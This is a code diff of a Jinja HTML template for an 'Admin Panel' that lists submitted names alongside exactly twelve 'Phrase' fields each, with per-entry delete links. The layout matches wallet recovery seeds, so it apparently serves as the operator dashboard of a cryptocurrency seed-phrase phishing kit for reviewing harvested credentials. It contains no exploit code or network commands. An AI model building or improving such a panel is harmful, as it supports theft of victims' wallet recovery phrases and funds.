@@ -1,61 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin Panel</title>
-<style>
-body {
-    font-family: Arial, sans-serif;
-    background-color: #0b0b0b;
-    margin: 0;
-    padding: 20px;
-}
-.card {
-    background: linear-gradient(180deg, #1e4620, #3a6b3a);
-    padding: 25px;
-    border-radius: 15px;
-    width: 100%;
-    max-width: 1200px;
-    margin: auto;
-    box-shadow: 0 0 20px rgba(0,0,0,0.6);
-}
-h1 { text-align: center; color: #d7ffd9; margin-bottom: 20px; }
-table { width: 100%; border-collapse: collapse; color: #fff; }
-th, td { border: 1px solid #333; padding: 10px; text-align: left; }
-th { background-color: #97c68d; color: #0b0b0b; }
-td { word-break: break-word; }
-a.delete { color: #ff5252; text-decoration: none; }
-a.delete:hover { text-decoration: underline; }
-@media (max-width: 768px) {
-    table, thead, tbody, th, td, tr { display: block; }
-    tr { margin-bottom: 15px; }
-    td { border: none; position: relative; padding-left: 50%; }
-    td::before { position: absolute; left: 10px; width: 45%; white-space: nowrap; font-weight: bold; content: attr(data-label); }
-}
-</style>
-</head>
-<body>
+{% extends "base.html" %}
+{% block content %}
+<h2>Admin Dashboard</h2>
+
+{% for row in data %}
 <div class="card">
-<h1>Admin Panel</h1>
-<table>
-<tr>
-    <th>Name</th>
-    {% for i in range(1,13) %}
-    <th>Phrase {{ i }}</th>
-    {% endfor %}
-    <th>Action</th>
-</tr>
-{% for idx, sub in enumerate(submissions) %}
-<tr>
-    <td data-label="Name">{{ sub.name }}</td>
-    {% for c in sub.codes %}
-    <td data-label="Phrase">{{ c }}</td>
-    {% endfor %}
-    <td data-label="Action"><a class="delete" href="/delete/{{ idx }}">Delete</a></td>
-</tr>
+<h3>{{row[1]}}</h3>
+
+{% for i in range(2,14) %}
+<p><b>Phrase {{i-1}}:</b> {{row[i]}}
+<a href="/delete/{{row[0]}}/{{i-1}}">
+<button>Delete</button>
+</a>
+</p>
 {% endfor %}
-</table>
 </div>
-</body>
-</html>
+{% endfor %}
+
+{% endblock %}
